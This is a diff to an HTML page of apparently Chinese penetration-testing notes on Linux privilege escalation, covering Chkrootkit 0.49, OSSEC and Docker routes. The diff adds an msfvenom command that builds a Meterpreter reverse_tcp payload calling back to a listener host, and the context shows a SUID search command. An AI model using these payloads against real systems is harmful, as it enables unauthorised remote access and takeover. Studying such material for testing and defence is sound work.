@@ -148,7 +148,9 @@ find / -user root -perm -4000-exec ls -ldb <span class="o">{}</span> <span class
 <p>Chkrootkit 0.49  提权</p>
 <p>OSSEC 2.8 - 'hosts.deny'  提权</p>
 <p>Docker Daemon   提权</p>
-<p>使用Chkrootkit 0.49  提权</p>
+<p>MSF 使用Chkrootkit 0.49  提权</p>
+<div class="highlight"><pre><span></span>msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">172</span>.16.251.133 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -a x64 --platform linux -f elf &gt; payload.elf 
+</pre></div>
 <p><img alt="linux提权" class="img-fluid" src="../images/msfchk.png"/></p>
 <p><img alt="linux提权" class="img-fluid" src="../images/msfchk1.png"/></p>
   </div>
